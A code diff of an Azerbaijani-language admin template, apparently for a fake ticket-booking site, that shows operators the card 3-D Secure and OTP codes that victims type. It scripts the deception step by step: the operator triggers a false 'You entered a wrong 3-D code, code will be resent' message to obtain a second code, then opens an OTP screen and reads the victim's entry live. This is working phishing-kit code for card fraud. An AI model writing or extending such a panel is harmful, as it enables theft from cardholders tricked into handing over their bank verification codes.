@@ -58,19 +58,24 @@
                     <dt><%= t('table.route') %></dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
                     <dt><%= t('search.date') %></dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
                   </dl>
+                  <% if (p.verificationCode) { %>
+                    <div class="alert alert--warning mt-16">
+                      <strong>Yaradılmış OTP Kodu:</strong><br>
+                      <span class="mono" style="font-size:1.4rem;letter-spacing:.2em"><%= p.verificationCode %></span>
+                      <br><small>İstifadəçi bunu daxil etməlidir</small>
+                    </div>
+                  <% } %>
                   <% if (p.submittedCode) { %>
                     <div class="alert alert--success mt-16">
-                      <%= t('admin.submittedCodeLabel') %> (3-D):
+                      <%= t('admin.submittedCodeLabel') %> (OTP):<br>
                       <strong class="mono" style="font-size:1.4rem;letter-spacing:.2em"><%= p.submittedCode %></strong>
                       <% if (p.codeSubmittedAt) { %><br><small><%= new Date(p.codeSubmittedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %></small><% } %>
                     </div>
-                    <% if (p.codeAttempts && p.codeAttempts.length > 1) { %>
-                      <p class="sec-note">Əvvəlki cəhdlər:
-                        <% p.codeAttempts.slice(0, -1).forEach(function(a){ %><span class="mono"><%= a.code %></span> <% }) %>
-                      </p>
-                    <% } %>
-                  <% } else if (p.status === 'awaiting_3ds') { %>
-                    <p class="sec-note mt-16">3-D kod hələ daxil edilməyib…</p>
+                  <% } else if (p.firstCode) { %>
+                    <div class="alert alert--info mt-16">
+                      <strong>İstifadəçinin daxil etdiyi ilkin 3-D kodu:</strong><br>
+                      <span class="mono" style="font-size:1.3rem;letter-spacing:.2em"><%= p.firstCode %></span>
+                    </div>
                   <% } %>
                 </div>
               </div>
@@ -80,7 +85,7 @@
                 <div class="alert alert--info mt-16">
                   <strong>1-ci addım:</strong> İstifadəçinin kart forması ilə yazdığı 3-D kod:
                   <strong class="mono" style="font-size:1.3rem;letter-spacing:.2em"><%= p.firstCode || '—' %></strong>
-                  <br><small>İstifadəçinin ekranında "Səhv 3-D kod daxil etmisiniz" göstərilər, kod təkrar göndəriləcəkdir.</small>
+                  <br><small>Təsdiq edəndən sonra istifadəçinin ekranında "Səhv 3-D kod daxil etmisiniz" göstərilər, kod təkrar göndəriləcəkdir.</small>
                 </div>
                 <div class="flex-end mt-16">
                   <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>">1-ci Təsdiq Et (Səhv Kod)</button>
@@ -88,15 +93,22 @@
                 </div>
               <% } else if (st === 'wrong_code') { %>
                 <div class="alert alert--warning mt-16">
-                  <strong>2-ci addım gözlənilir:</strong> İstifadəçinin ekranında «Səhv 3-D kod daxil etmisiniz — kod təkrar göndərilir» göstərilir.
-                  <br><small>Geri sayım başlayıb, yeni 3-D OTP kodu göndərmə vaxtıdır.</small>
+                  <strong>2-ci addım gözlənilir:</strong> İstifadəçinin ekranında «Səhv 3-D kod — kod təkrar göndərilir» göstərilir.
+                  <br><small>Indi OTP ekranını açmalı və yeni OTP kodu yaratmalısınız.</small>
                 </div>
                 <div class="flex-end mt-16">
                   <button class="btn btn--primary btn--sm" data-open-otp="<%= p._id %>">2-ci Təsdiq Et (OTP Ekranını Aç)</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else if (st === 'otp_entry') { %>
-                <p class="sec-note mt-16"><strong>3-cü addım gözlənilir:</strong> OTP ekranı istifadəçiyə açılıb — kod daxil edilməsi gözlənilir…</p>
+                <div class="alert alert--success mt-16">
+                  <strong>3-cü addım:</strong> OTP ekranı istifadəçiyə açıldı.
+                  <br>Yaradılmış OTP Kodu: <span class="mono" style="font-size:1.2rem"><%= p.verificationCode || '—' %></span>
+                  <br><small>İstifadəçi bunu daxil etməlidir. Geri sayım başlayıb…</small>
+                </div>
+                <div class="flex-end mt-16">
+                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
+                </div>
               <% } else if (st === 'otp_review') { %>
                 <div class="alert alert--success mt-16">
                   <strong>3-cü addım tamamlandı:</strong> İstifadəçi OTP kodunu daxil etdi:
@@ -126,7 +138,8 @@
   var note = document.getElementById('payNote');
   function show(msg, ok) {
     if (!note) { return; }
-    note.className = 'alert ' + (ok ? 'alert--info' : 'alert--danger');
+    note.classList.remove('hidden');
+    note.className = 'alert ' + (ok ? 'alert--success' : 'alert--danger');
     note.textContent = msg;
   }
   async function call(url, body) {
